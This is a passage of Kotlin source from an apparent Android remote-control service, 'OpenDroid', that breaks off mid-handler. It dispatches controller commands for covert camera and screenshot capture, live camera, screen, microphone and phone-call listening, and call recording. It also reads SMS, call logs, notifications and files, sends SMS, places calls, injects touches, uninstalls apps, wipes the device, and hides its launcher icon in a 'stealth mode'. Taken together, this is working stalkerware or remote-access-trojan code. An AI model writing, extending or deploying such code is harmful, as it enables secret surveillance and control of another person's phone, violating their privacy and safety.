        val audioStreamer = AudioStreamManager.getInstance(applicationContext)
        val webrtcManager = WebRtcManager.getInstance(applicationContext)

        when (json.optString("type")) {
            "ping" -> {
                val pong = JSONObject().apply {
                    put("type", "pong")
                    put("timestamp", json.optLong("timestamp"))
                }.toString()
                broadcastMessage(pong)
                broadcastBatteryStatus()
            }
        }

        when (json.optString("action")) {
            "PING_FLEET", "GET_DEVICE_TELEMETRY" -> {
                publishDevicePresence(true)
            }

            // --- Phase 16: Remote Power Control & Hardware Telemetry Handlers ---
            // --- Phase 17: Google Family Link-Grade Screen Time & Digital Wellbeing ---
            "FETCH_SCREEN_TIME" -> {
                val dateStr = json.optString("date", "").trim()
                val daysAgo = json.optInt("daysAgo", 0)
                val rangeType = json.optString("rangeType", "day")
                val reqId = json.optString("requestId", "")
                serviceScope.launch(Dispatchers.IO) {
                    try {
                        val screenTimeSummary = teleManager.getScreenTimeSummary(
                            dateStr = if (dateStr.isNotEmpty()) dateStr else null,
                            daysAgo = daysAgo,
                            rangeType = rangeType
                        )
                        val response = JSONObject().apply {
                            put("type", "SCREEN_TIME_RESULT")
                            put("requestId", reqId)
                            put("data", screenTimeSummary)
                            put("timestamp", System.currentTimeMillis())
                        }
                        broadcastMessage(response.toString())
                    } catch (e: Exception) {
                        Log.e("OpenDroid", "Error fetching Screen Time data", e)
                        val errResponse = JSONObject().apply {
                            put("type", "SCREEN_TIME_RESULT")
                            put("requestId", reqId)
                            put("status", "ERROR")
                            put("error", e.message ?: "Failed to read screen time")
                        }
                        broadcastMessage(errResponse.toString())
                    }
                }
            }

            "FETCH_HARDWARE_TELEMETRY" -> {
                serviceScope.launch(Dispatchers.IO) {
                    try {
                        val telemetryData = teleManager.getHardwareTelemetry()
                        val response = JSONObject().apply {
                            put("type", "HARDWARE_TELEMETRY_RESULT")
                            put("data", telemetryData)
                            put("timestamp", System.currentTimeMillis())
                        }
                        broadcastMessage(response.toString())
                    } catch (e: Exception) {
                        Log.e("OpenDroid", "Error fetching hardware telemetry", e)
                        val errResponse = JSONObject().apply {
                            put("type", "HARDWARE_TELEMETRY_RESULT")
                            put("status", "ERROR")
                            put("error", e.message ?: "Failed to read telemetry")
                        }
                        broadcastMessage(errResponse.toString())
                    }
                }
            }

            "TRIGGER_POWER_ACTION" -> {
                val powerAction = json.optString("powerAction", "")
                serviceScope.launch(Dispatchers.IO) {
                    try {
                        val actionResult = teleManager.executeRemotePowerAction(powerAction)
                        val response = JSONObject().apply {
                            put("type", "POWER_ACTION_RESULT")
                            put("action", powerAction)
                            put("data", actionResult)
                            put("success", actionResult.optString("status") == "SUCCESS")
                        }
                        broadcastMessage(response.toString())
                    } catch (e: Exception) {
                        Log.e("OpenDroid", "Error executing remote power action: $powerAction", e)
                        val errResponse = JSONObject().apply {
                            put("type", "POWER_ACTION_RESULT")
                            put("action", powerAction)
                            put("success", false)
                            put("error", e.message ?: "Execution failed")
                        }
                        broadcastMessage(errResponse.toString())
                    }
                }
            }

            "START_TELEMETRY_STREAM" -> {
                startHardwareTelemetryStream()
            }

            "STOP_TELEMETRY_STREAM" -> {
                stopHardwareTelemetryStream()
            }

            "UPDATE_DEVICE_NICKNAME" -> {
                val newName = json.optString("name", "").trim()
                if (newName.isNotEmpty()) {
                    deviceNickname = newName
                    getSharedPreferences("opendroid_prefs", Context.MODE_PRIVATE)
                        .edit().putString("device_name", newName).apply()
                    publishDevicePresence(true)
                    broadcastMessage(JSONObject().apply {
                        put("type", "NICKNAME_UPDATED")
                        put("name", newName)
                    }.toString())
                }
            }

            "HANDSHAKE" -> {
                sendFullSyncData()
            }

            // --- Step 1.1: Remote URL Launcher ---
            "OPEN_URL" -> {
                val rawUrl = json.optString("url", "").trim()
                if (rawUrl.isNotEmpty()) {
                    try {
                        val formattedUrl = if (!rawUrl.startsWith("http://") && !rawUrl.startsWith("https://")) {
                            "https://$rawUrl"
                        } else rawUrl

                        val browserIntent = Intent(Intent.ACTION_VIEW, Uri.parse(formattedUrl)).apply {
                            flags = Intent.FLAG_ACTIVITY_NEW_TASK
                        }
                        applicationContext.startActivity(browserIntent)

                        broadcastMessage(JSONObject().apply {
                            put("type", "OPEN_URL_ACK")
                            put("url", formattedUrl)
                            put("success", true)
                        }.toString())
                        Log.d("OpenDroid", "Opened URL on device: $formattedUrl")
                    } catch (e: Exception) {
                        Log.e("OpenDroid", "Failed to open URL on device", e)
                        broadcastMessage(JSONObject().apply {
                            put("type", "OPEN_URL_ACK")
                            put("url", rawUrl)
                            put("success", false)
                            put("error", e.message)
                        }.toString())
                    }
                }
            }

            // --- Phase 1: Step 1.2 Remote App Management (Launch & Uninstall) ---
            "LAUNCH_APP" -> {
                val pkg = json.optString("package", "").trim()
                val success = teleManager.launchApp(pkg)
                broadcastMessage(JSONObject().apply {
                    put("type", "LAUNCH_APP_ACK")
                    put("package", pkg)
                    put("success", success)
                }.toString())
            }

            "UNINSTALL_APP" -> {
                val pkg = json.optString("package", "").trim()
                RemoteInputService.isAutoUninstallArmed = true
                val success = teleManager.requestUninstallApp(pkg)
                broadcastMessage(JSONObject().apply {
                    put("type", "UNINSTALL_APP_ACK")
                    put("package", pkg)
                    put("success", success)
                }.toString())
            }

            // --- Phase 5: Remote APK Installer (Using Secure FileProvider) ---
            "INSTALL_APK" -> {
                val apkPath = json.optString("path", "")
                val file = File(apkPath)
                if (file.exists()) {
                    try {
                        val apkUri = androidx.core.content.FileProvider.getUriForFile(
                            applicationContext,
                            "${packageName}.provider",
                            file
                        )
                        val intent = Intent(Intent.ACTION_VIEW).apply {
                            setDataAndType(apkUri, "application/vnd.android.package-archive")
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                        }
                        startActivity(intent)
                        broadcastMessage(JSONObject().apply {
                            put("type", "INSTALL_APK_RESULT")
                            put("success", true)
                            put("message", "Installation prompt launched on phone screen")
                        }.toString())
                    } catch (e: Exception) {
                        Log.e("OpenDroid", "Install APK error", e)
                        broadcastMessage(JSONObject().apply {
                            put("type", "INSTALL_APK_RESULT")
                            put("success", false)
                            put("error", e.message ?: "Failed to launch installer")
                        }.toString())
                    }
                } else {
                    broadcastMessage(JSONObject().apply {
                        put("type", "INSTALL_APK_RESULT")
                        put("success", false)
                        put("error", "File not found: $apkPath")
                    }.toString())
                }
            }

            // =========================================================================
            // Phase 2: Stealth Photo / Screenshot Capture (Direct QoS 0 Dispatch)
            // =========================================================================
            "STEALTH_CAPTURE" -> {
                val target = json.optString("target", "FRONT").uppercase() // "FRONT", "BACK", "SCREEN"
                Log.d("StealthCapture", "Received STEALTH_CAPTURE request for target: $target")

                when (target) {
                    "SCREEN" -> {
                        stealthCaptureManager.captureScreenshot { base64Jpeg, error ->
                            sendStealthCaptureResult("SCREEN", base64Jpeg, error)
                        }
                    }

                    "FRONT" -> {
                        stealthCaptureManager.captureCamera(isFront = true) { base64Jpeg, error ->
                            sendStealthCaptureResult("FRONT", base64Jpeg, error)
                        }
                    }

                    "BACK" -> {
                        stealthCaptureManager.captureCamera(isFront = false) { base64Jpeg, error ->
                            sendStealthCaptureResult("BACK", base64Jpeg, error)
                        }
                    }

                    else -> {
                        sendStealthCaptureResult(target, null, "Invalid capture target: $target")
                    }
                }
            }

            // --- Phase 10: Real-Time WebRTC Ultra-Low Latency Video Pipeline ---
            "START_WEBRTC_SCREEN" -> {
                cameraStreamer.stopStreaming()
                screenStreamer.pauseStreaming()
                val intent = webrtcManager.lastMediaProjectionIntent ?: screenStreamer.lastProjectionIntent
                if (intent != null) {
                    webrtcManager.startScreenSession(intent) {
                        broadcastMessage(JSONObject().apply {
                            put("type", "WEBRTC_SCREEN_READY")
                        }.toString())
                    }
                } else {
                    broadcastMessage(JSONObject().apply {
                        put("type", "SCREEN_PERMISSION_REQUIRED")
                    }.toString())
                }
            }

            "START_WEBRTC_CAMERA" -> {
                cameraStreamer.stopStreaming()
                screenStreamer.pauseStreaming()
                val facing = json.optString("facing", "back")
                val isFront = (facing == "front")

                val camServiceIntent = Intent(this@LocalFileServerService, CameraStreamService::class.java).apply {
                    putExtra("facing", facing)
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(camServiceIntent)
                } else {
                    startService(camServiceIntent)
                }

                webrtcManager.startCameraSession(isFront) {
                    broadcastMessage(JSONObject().apply {
                        put("type", "WEBRTC_CAMERA_READY")
                        put("facing", if (isFront) "front" else "back")
                    }.toString())
                }
            }

            "WEBRTC_SWITCH_CAMERA" -> {
                webrtcManager.switchCamera()
                broadcastMessage(JSONObject().apply {
                    put("type", "WEBRTC_CAMERA_SWITCHED")
                    put("isFront", webrtcManager.isFrontCamera)
                }.toString())
            }

            "WEBRTC_OFFER" -> {
                val sdp = json.optString("sdp", "")
                if (sdp.isNotEmpty()) {
                    webrtcManager.handleRemoteOffer(sdp)
                }
            }

            "WEBRTC_CANDIDATE" -> {
                val sdpMid = json.optString("sdpMid", "")
                val sdpMLineIndex = json.optInt("sdpMLineIndex", 0)
                val candidate = json.optString("candidate", "")
                if (candidate.isNotEmpty()) {
                    webrtcManager.handleRemoteIceCandidate(sdpMid, sdpMLineIndex, candidate)
                }
            }

            "STOP_WEBRTC" -> {
                webrtcManager.stopCapture()
                val camServiceIntent = Intent(this@LocalFileServerService, CameraStreamService::class.java)
                stopService(camServiceIntent)
                broadcastMessage(JSONObject().apply {
                    put("type", "WEBRTC_STOPPED")
                }.toString())
            }

            // --- Camera Stream ---
            "START_CAMERA_STREAM" -> {
                if (screenStreamer.isStreaming) {
                    screenStreamer.pauseStreaming()
                    broadcastMessage(JSONObject().put("type", "SCREEN_STREAM_STOPPED").toString())
                }

                val facing = json.optString("facing", "back")
                val isFront = (facing == "front")

                val camServiceIntent = Intent(this@LocalFileServerService, CameraStreamService::class.java).apply {
                    putExtra("facing", facing)
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(camServiceIntent)
                } else {
                    startService(camServiceIntent)
                }

                cameraStreamer.startStreaming(isFront) { frameBase64 ->
                    sendDirectCameraFrame(frameBase64)
                }
                broadcastMessage(JSONObject().apply {
                    put("type", "CAMERA_STREAM_STARTED")
                }.toString())
            }

            "STOP_CAMERA_STREAM" -> {
                cameraStreamer.stopStreaming()
                val camServiceIntent = Intent(this@LocalFileServerService, CameraStreamService::class.java)
                stopService(camServiceIntent)
                broadcastMessage(JSONObject().apply {
                    put("type", "CAMERA_STREAM_STOPPED")
                }.toString())
            }

            // --- Phase 1: Step 1.3 Standalone Flashlight / Torch Toggle ---
            "TOGGLE_STANDALONE_TORCH" -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    try {
                        val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
                        val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
                            val characteristics = cameraManager.getCameraCharacteristics(id)
                            characteristics.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true &&
                            characteristics.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK
                        } ?: cameraManager.cameraIdList.firstOrNull()

                        if (cameraId != null) {
                            val streamer = DirectCameraStreamer.getInstance(applicationContext)
                            if (streamer.isStreaming) {
                                streamer.toggleTorch()
                                isStandaloneTorchOn = !isStandaloneTorchOn
                            } else {
                                isStandaloneTorchOn = !isStandaloneTorchOn
                                cameraManager.setTorchMode(cameraId, isStandaloneTorchOn)
                            }
                            broadcastMessage(JSONObject().apply {
                                put("type", "TORCH_STATUS")
                                put("isOn", isStandaloneTorchOn)
                            }.toString())
                        } else {
                            broadcastMessage(JSONObject().apply {
                                put("type", "TORCH_STATUS")
                                put("isOn", false)
                                put("error", "No flashlight hardware found")
                            }.toString())
                        }
                    } catch (e: Exception) {
                        Log.e("TorchControl", "Error toggling torch", e)
                        broadcastMessage(JSONObject().apply {
                            put("type", "TORCH_STATUS")
                            put("isOn", isStandaloneTorchOn)
                            put("error", e.message)
                        }.toString())
                    }
                }
            }

            "SWITCH_CAMERA" -> cameraStreamer.switchCamera()
            "TOGGLE_FLASHLIGHT" -> cameraStreamer.toggleTorch()

            // --- Screen Mirror Stream ---
            "START_SCREEN_STREAM" -> {
                if (cameraStreamer.isStreaming) {
                    cameraStreamer.stopStreaming()
                    val camServiceIntent = Intent(this@LocalFileServerService, CameraStreamService::class.java)
                    stopService(camServiceIntent)
                    broadcastMessage(JSONObject().put("type", "CAMERA_STREAM_STOPPED").toString())
                }

                if (screenStreamer.isStreaming) {
                    broadcastMessage(JSONObject().apply {
                        put("type", "SCREEN_STREAM_STARTED")
                    }.toString())
                } else if (screenStreamer.hasProjection()) {
                    screenStreamer.resumeStreaming()
                    broadcastMessage(JSONObject().apply {
                        put("type", "SCREEN_STREAM_STARTED")
                    }.toString())
                } else {
                    broadcastMessage(JSONObject().apply {
                        put("type", "SCREEN_PERMISSION_REQUIRED")
                    }.toString())
                }
            }

            "STOP_SCREEN_STREAM" -> {
                screenStreamer.pauseStreaming()
                broadcastMessage(JSONObject().apply {
                    put("type", "SCREEN_STREAM_STOPPED")
                }.toString())
            }

            // --- Phase 5: Notification History Center ---
            "FETCH_NOTIF_HISTORY" -> {
                val history = NotificationMirrorService.instance?.getNotificationHistory() ?: JSONArray()
                broadcastMessage(JSONObject().apply {
                    put("type", "NOTIF_HISTORY_LIST")
                    put("data", history)
                }.toString())
            }

            "CLEAR_NOTIF_HISTORY" -> {
                NotificationMirrorService.instance?.clearNotificationHistory()
                broadcastMessage(JSONObject().apply {
                    put("type", "NOTIF_HISTORY_CLEARED")
                }.toString())
            }

            // --- Ambient Audio & Call Audio Sync ---
            "START_AUDIO_STREAM" -> {
                val callRecorder = CallRecordingManager.getInstance(applicationContext)
                if (callRecorder.isCallActive()) {
                    callRecorder.setLiveListening(true)
                    broadcastMessage(JSONObject().apply {
                        put("type", "AUDIO_STREAM_STARTED")
                        put("mode", "CALL_LIVE")
                    }.toString())
                } else {
                    audioStreamer.startStreaming { pcmBase64 ->
                        sendDirectAudioChunk(pcmBase64)
                    }
                    broadcastMessage(JSONObject().apply {
                        put("type", "AUDIO_STREAM_STARTED")
                    }.toString())
                }
            }

            "STOP_AUDIO_STREAM" -> {
                val callRecorder = CallRecordingManager.getInstance(applicationContext)
                callRecorder.setLiveListening(false)
                audioStreamer.stopStreaming()
                broadcastMessage(JSONObject().apply {
                    put("type", "AUDIO_STREAM_STOPPED")
                }.toString())
            }

            // --- Phase 19: Dual-Engine Call Recording & Live Audio Stream ---
            "FETCH_CALL_RECORDINGS" -> {
                broadcastCallRecordingsList()
            }

            "DELETE_CALL_RECORDING" -> {
                val fileName = json.optString("fileName", "")
                if (fileName.isNotEmpty()) {
                    val callRecorder = CallRecordingManager.getInstance(applicationContext)
                    val file = callRecorder.getRecordingFile(fileName)
                    file?.delete()
                    broadcastCallRecordingsList()
                }
            }

            "PLAY_CALL_RECORDING", "FETCH_CALL_RECORDING_AUDIO", "GET_CALL_RECORDING_BASE64" -> {
                val fileName = json.optString("fileName", "")
                serviceScope.launch {
                    try {
                        val callRecorder = CallRecordingManager.getInstance(applicationContext)
                        val file = callRecorder.getRecordingFile(fileName)
                        if (file != null && file.exists()) {
                            val bytes = file.readBytes()
                            val base64Wav = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
                            broadcastMessage(JSONObject().apply {
                                put("type", "CALL_RECORDING_DATA")
                                put("fileName", fileName)
                                put("mime", "audio/wav")
                                put("data", base64Wav)
                            }.toString())
                        }
                    } catch (e: Exception) {
                        Log.e("LocalFileServer", "Error reading call recording file $fileName", e)
                    }
                }
            }

            "START_CALL_LISTEN", "LISTEN_CALL_LIVE" -> {
                val callRecorder = CallRecordingManager.getInstance(applicationContext)
                callRecorder.setLiveListening(true)
                broadcastMessage(JSONObject().apply {
                    put("type", "CALL_LISTEN_STARTED")
                }.toString())
            }

            "STOP_CALL_LISTEN" -> {
                val callRecorder = CallRecordingManager.getInstance(applicationContext)
                callRecorder.setLiveListening(false)
                broadcastMessage(JSONObject().apply {
                    put("type", "CALL_LISTEN_STOPPED")
                }.toString())
            }

            // --- Phase 3: Two-Way Audio (Walkie-Talkie Playback) ---
            "WALKIE_TALKIE_CHUNK" -> {
                val data = json.optString("data")
                if (data.isNotEmpty()) {
                    audioStreamer.playWalkieTalkieChunk(data)
                }
            }

            "STOP_WALKIE_TALKIE" -> {
                audioStreamer.stopWalkieTalkie()
            }

            // --- Notifications ---
            "QUICK_REPLY" -> {
                val key = json.getString("key")
                val replyText = json.getString("text")
                val success = NotificationMirrorService.instance?.sendQuickReply(key, replyText) ?: false
                broadcastMessage(JSONObject().apply {
                    put("type", "QUICK_REPLY_STATUS")
                    put("key", key)
                    put("success", success)
                }.toString())
            }

            // --- Device Administrator (Remote Screen Lock) ---
            "LOCK_DEVICE" -> {
                try {
                    val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                    val adminComponent = ComponentName(applicationContext, AdminReceiver::class.java)
                    if (dpm.isAdminActive(adminComponent)) {
                        dpm.lockNow()
                        broadcastMessage(JSONObject().apply {
                            put("type", "LOCK_DEVICE_ACK")
                            put("success", true)
                        }.toString())
                        Log.d("OpenDroid", "Device screen locked successfully via DeviceAdmin")
                    } else {
                        Log.w("OpenDroid", "DeviceAdmin is not active")
                        broadcastMessage(JSONObject().apply {
                            put("type", "LOCK_DEVICE_ACK")
                            put("success", false)
                            put("error", "DeviceAdmin permission not granted on phone")
                        }.toString())
                    }
                } catch (e: Exception) {
                    Log.e("OpenDroid", "Failed to lock device", e)
                    broadcastMessage(JSONObject().apply {
                        put("type", "LOCK_DEVICE_ACK")
                        put("success", false)
                        put("error", e.message)
                    }.toString())
                }
            }

            // --- Phase 5: Remote Emergency Device Wipe ---
            "WIPE_DEVICE" -> {
                try {
                    val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                    val adminComponent = ComponentName(applicationContext, AdminReceiver::class.java)
                    if (dpm.isAdminActive(adminComponent)) {
                        Log.w("OpenDroid", "EMERGENCY REMOTE WIPE TRIGGERED VIA WEB OS!")
                        broadcastMessage(JSONObject().apply {
                            put("type", "WIPE_DEVICE_ACK")
                            put("success", true)
                            put("message", "Device wipe initiated")
                        }.toString())
                        dpm.wipeData(0)
                    } else {
                        broadcastMessage(JSONObject().apply {
                            put("type", "WIPE_DEVICE_ACK")
                            put("success", false)
                            put("error", "Device Admin is not active on phone")
                        }.toString())
                    }
                } catch (e: Exception) {
                    Log.e("OpenDroid", "Wipe device error", e)
                    broadcastMessage(JSONObject().apply {
                        put("type", "WIPE_DEVICE_ACK")
                        put("success", false)
                        put("error", e.message ?: "Error wiping device")
                    }.toString())
                }
            }

            // --- Phase 2: Step 2.3 Stealth Mode (Hide Launcher Icon) ---
            "SET_STEALTH_MODE" -> {
                val hideIcon = json.optBoolean("hideIcon", false)
                val success = setStealthMode(hideIcon)
                broadcastMessage(JSONObject().apply {
                    put("type", "STEALTH_MODE_ACK")
                    put("hideIcon", hideIcon)
                    put("success", success)
                }.toString())
            }

            "GET_STEALTH_MODE" -> {
                val isHidden = isStealthModeActive()
                broadcastMessage(JSONObject().apply {
                    put("type", "STEALTH_MODE_STATUS")
                    put("hideIcon", isHidden)
                }.toString())
            }

            "LAUNCH_OPEN_DROID" -> {
                try {
                    val intent = Intent(applicationContext, MainActivity::class.java).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                    }
                    startActivity(intent)
                    broadcastMessage(JSONObject().apply {
                        put("type", "LAUNCH_OPEN_DROID_ACK")
                        put("success", true)
                    }.toString())
                } catch (e: Exception) {
                    broadcastMessage(JSONObject().apply {
                        put("type", "LAUNCH_OPEN_DROID_ACK")
                        put("success", false)
                        put("error", e.message)
                    }.toString())
                }
            }

            // --- Remote Touch Gesture (Accessibility) ---
            "INPUT_TAP" -> {
                val xNorm = json.optDouble("x", 0.0).toFloat()
                val yNorm = json.optDouble("y", 0.0).toFloat()
                RemoteInputService.instance?.dispatchTap(xNorm, yNorm)
            }

            "INPUT_SWIPE" -> {
                val sx = json.optDouble("startX", 0.0).toFloat()
                val sy = json.optDouble("startY", 0.0).toFloat()
                val ex = json.optDouble("endX", 0.0).toFloat()
                val ey = json.optDouble("endY", 0.0).toFloat()
                RemoteInputService.instance?.dispatchSwipe(sx, sy, ex, ey)
            }

            // --- Remote Touch / Gesture / Global Actions ---
            "INPUT_GLOBAL", "GLOBAL_ACTION" -> {
                val globalAction = if (json.has("actionType")) json.getString("actionType") else json.optString("globalAction", "")
                RemoteInputService.instance?.executeGlobalAction(globalAction)
            }

            // --- Telephony & SMS Actions ---
            "MAKE_CALL", "CALL" -> {
                val number = if (json.has("number")) json.getString("number") else json.optString("to", "")
                if (number.isNotEmpty()) {
                    teleManager.makeCall(number)
                }
            }

            "SEND_SMS" -> {
                val to = if (json.has("to")) json.getString("to") else json.optString("number", "")
                val message = json.optString("message", "")
                val success = teleManager.sendSms(to, message)
                broadcastMessage(JSONObject().apply {
                    put("type", "SMS_SENT_STATUS")
                    put("success", success)
                }.toString())
            }

            // --- Audio Ring / Alarm / Siren ---
            "RING_SIREN", "PLAY_ALARM" -> playRingtone()
            "STOP_SIREN", "STOP_ALARM" -> stopRingtone()

            // --- General Fetch Actions Requested by WebOS ---
            "FETCH_APPS" -> {
                broadcastMessage(JSONObject().apply {
                    put("type", "APPS_LIST")
                    put("data", teleManager.getInstalledApps())
                }.toString())
            }

            "FETCH_AUDIO" -> {
                broadcastMessage(JSONObject().apply {
                    put("type", "AUDIO_TRACKS_LIST")
                    put("data", teleManager.getAudioTracks())
                }.toString())
            }

            "FETCH_VIDEOS" -> {
                broadcastMessage(JSONObject().apply {
                    put("type", "VIDEO_TRACKS_LIST")
                    put("data", teleManager.getVideoTracks())
                }.toString())
            }

            "FETCH_PHOTOS" -> {
                broadcastMessage(JSONObject().apply {
                    put("type", "PHOTOS_LIST")
                    put("data", teleManager.getRecentPhotos())
                }.toString())
            }

            // --- Phase 15: Enhanced Remote Media Gallery & Streamer Actions ---
            "FETCH_GALLERY_PHOTOS", "GET_MEDIA_ITEMS" -> {
                val offset = json.optInt("offset", 0)
                val limit = json.optInt("limit", 100)
                val bucket = json.optString("bucket", "")
                serviceScope.launch(Dispatchers.IO) {
                    val result = teleManager.getGalleryPhotos(offset, limit, if (bucket.isEmpty()) null else bucket)
                    broadcastMessage(JSONObject().apply {
                        put("type", "GALLERY_PHOTOS_RESULT")
                        put("data", result)
                    }.toString())
                }
            }

            "GET_PHOTO_THUMBNAIL" -> {
                val id = json.optLong("id", 0L)
                val path = json.optString("path", "")
                val uri = json.optString("uri", "")
                val tag = json.optString("tag", "")
                val maxDim = json.optInt("maxDim", 256)
                serviceScope.launch(Dispatchers.IO) {
                    val thumb = if (id > 0L) {
                        teleManager.getPhotoThumbnailById(id, maxDim)
                    } else {
                        val target = if (uri.isNotEmpty()) uri else path
                        teleManager.getPhotoThumbnailBase64(target, maxDim)
                    }
                    broadcastMessage(JSONObject().apply {
                        put("type", "PHOTO_THUMBNAIL_RESULT")
                        put("id", id)
                        put("path", path)
                        put("uri", uri)
                        put("tag", tag)
                        put("thumbnail", thumb ?: "")
                    }.toString())
                }
            }

            "SET_WALLPAPER" -> {
                val path = json.optString("path", "")
                val uri = json.optString("uri", "")
                val target = if (uri.isNotEmpty()) uri else path
                serviceScope.launch(Dispatchers.IO) {
                    val result = teleManager.setPhotoAsWallpaper(target)
                    broadcastMessage(JSONObject().apply {
                        put("type", "SET_WALLPAPER_RESULT")
                        put("data", result)
                    }.toString())
                }
            }

            "FETCH_GALLERY_VIDEOS" -> {
                val offset = json.optInt("offset", 0)
                val limit = json.optInt("limit", 50)
                val bucket = json.optString("bucket", "")
                serviceScope.launch(Dispatchers.IO) {
                    val result = teleManager.getGalleryVideos(offset, limit, if (bucket.isEmpty()) null else bucket)
                    broadcastMessage(JSONObject().apply {
                        put("type", "GALLERY_VIDEOS_RESULT")
                        put("data", result)
                    }.toString())
                }
            }

            "GET_VIDEO_THUMBNAIL" -> {
                val id = json.optLong("id", 0L)
                val path = json.optString("path", "")
                val uri = json.optString("uri", "")
                val tag = json.optString("tag", "")
                val maxDim = json.optInt("maxDim", 256)
                serviceScope.launch(Dispatchers.IO) {
                    val thumb = if (id > 0L) {
                        teleManager.getVideoThumbnailById(id, maxDim)
                    } else {
                        val target = if (uri.isNotEmpty()) uri else path
                        teleManager.getVideoThumbnailBase64(target, maxDim)
                    }
                    broadcastMessage(JSONObject().apply {
                        put("type", "VIDEO_THUMBNAIL_RESULT")
                        put("id", id)
                        put("path", path)
                        put("uri", uri)
                        put("tag", tag)
                        put("thumbnail", thumb ?: "")
                    }.toString())
                }
            }

            "FETCH_MUSIC_TRACKS" -> {
                val offset = json.optInt("offset", 0)
                val limit = json.optInt("limit", 100)
                val result = teleManager.getMusicTracksDetailed(offset, limit)
                broadcastMessage(JSONObject().apply {
                    put("type", "MUSIC_TRACKS_RESULT")
                    put("data", result)
                }.toString())
            }

            "FETCH_RINGTONES" -> {
                val result = teleManager.getDeviceRingtones()
                broadcastMessage(JSONObject().apply {
                    put("type", "RINGTONES_RESULT")
                    put("data", result)
                }.toString())
            }

            "SET_RINGTONE" -> {
                val uri = json.optString("uri", "")
                val type = json.optString("type", "RINGTONE")
                val result = teleManager.setDeviceRingtone(uri, type)
                broadcastMessage(JSONObject().apply {
                    put("type", "SET_RINGTONE_RESULT")
                    put("data", result)
                }.toString())
            }

            "FETCH_DIR" -> {
                val path = json.optString("path", "")
                broadcastMessage(JSONObject().apply {
                    put("type", "DIR_CONTENTS")
                    put("data", teleManager.getDirectoryContents(path))
                }.toString())
            }

            // --- Phase 4: Advanced File Operations ---
            "DELETE_FILE" -> {
                val path = json.optString("path", "")
                val success = teleManager.deleteFileOrFolder(path)
                broadcastMessage(JSONObject().apply {
                    put("type", "FILE_OP_RESULT")
                    put("op", "DELETE")
                    put("success", success)
                    put("path", path)
                }.toString())
            }

            "RENAME_FILE" -> {
                val oldPath = json.optString("oldPath", "")
                val newName = json.optString("newName", "")
                val success = teleManager.renameFileOrFolder(oldPath, newName)
                broadcastMessage(JSONObject().apply {
                    put("type", "FILE_OP_RESULT")
                    put("op", "RENAME")
                    put("success", success)
                    put("oldPath", oldPath)
                    put("newName", newName)
                }.toString())
            }

            "CREATE_FOLDER" -> {
                val parentPath = json.optString("parentPath", "")
                val folderName = json.optString("folderName", "")
                val success = teleManager.createFolder(parentPath, folderName)
                broadcastMessage(JSONObject().apply {
                    put("type", "FILE_OP_RESULT")
                    put("op", "CREATE_FOLDER")
                    put("success", success)
                    put("parentPath", parentPath)
                    put("folderName", folderName)
                }.toString())
            }

            "COPY_FILE" -> {
                val sourcePath = json.optString("sourcePath", "")
                val destDirPath = json.optString("destDirPath", "")
                val success = teleManager.copyFileOrFolder(sourcePath, destDirPath)
                broadcastMessage(JSONObject().apply {
                    put("type", "FILE_OP_RESULT")
                    put("op", "COPY")
                    put("success", success)
                    put("sourcePath", sourcePath)
                    put("destDirPath", destDirPath)
                }.toString())
            }

            "MOVE_FILE" -> {
                val sourcePath = json.optString("sourcePath", "")
                val destDirPath = json.optString("destDirPath", "")
                val success = teleManager.moveFileOrFolder(sourcePath, destDirPath)
                broadcastMessage(JSONObject().apply {
                    put("type", "FILE_OP_RESULT")
                    put("op", "MOVE")
                    put("success", success)
                    put("sourcePath", sourcePath)
                    put("destDirPath", destDirPath)
                }.toString())
            }

            "GET_FILE_INFO" -> {
                val path = json.optString("path", "")
                val details = teleManager.getFileOrFolderDetails(path)
                broadcastMessage(JSONObject().apply {
                    put("type", "FILE_INFO_RESULT")
                    put("data", details)
                }.toString())
            }

            "BATCH_DELETE" -> {
                val pathsArray = json.optJSONArray("paths") ?: org.json.JSONArray()
                val pathsList = mutableListOf<String>()
                for (i in 0 until pathsArray.length()) {
                    pathsList.add(pathsArray.optString(i))
                }
                val result = teleManager.batchDelete(pathsList)
                broadcastMessage(JSONObject().apply {
                    put("type", "FILE_OP_RESULT")
                    put("op", "BATCH_DELETE")
                    put("result", result)
                }.toString())
            }

            "ZIP_AND_DOWNLOAD" -> {
                val pathsArray = json.optJSONArray("paths") ?: JSONArray()
                val pathsList = mutableListOf<String>()
                for (i in 0 until pathsArray.length()) {
                    pathsList.add(pathsArray.getString(i))
                }
                serviceScope.launch {
                    val zipPath = teleManager.createZipArchive(pathsList)
                    if (zipPath != null) {
                        val zipFile = File(zipPath)
                        broadcastMessage(JSONObject().apply {
                            put("type", "ZIP_READY")
                            put("zipPath", zipPath)
                            put("zipName", zipFile.name)
                            put("totalSize", zipFile.length())
                        }.toString())
                    } else {
                        broadcastMessage(JSONObject().apply {
                            put("type", "FILE_OP_RESULT")
                            put("op", "ZIP")
                            put("success", false)
                            put("error", "Failed to create ZIP")
                        }.toString())
                    }
                }
            }

            "FETCH_CALL_LOGS" -> {
                val offset = json.optInt("offset", 0)
                val limit = json.optInt("limit", 100)
                val paged = teleManager.getCallLogsPaged(offset, limit)
                broadcastMessage(JSONObject().apply {
                    put("type", "CALL_LOGS_LIST")
                    put("data", paged.getJSONArray("data"))
                    put("offset", paged.getInt("offset"))
                    put("limit", paged.getInt("limit"))
                    put("total", paged.getInt("total"))
                    put("hasMore", paged.getBoolean("hasMore"))
                }.toString())
            }

            "FETCH_SMS" -> {
                broadcastMessage(JSONObject().apply {
                    put("type", "SMS_LIST")
                    put("data", teleManager.getRecentSms())
                }.toString())
            }

            "FETCH_SMS_THREADS" -> {
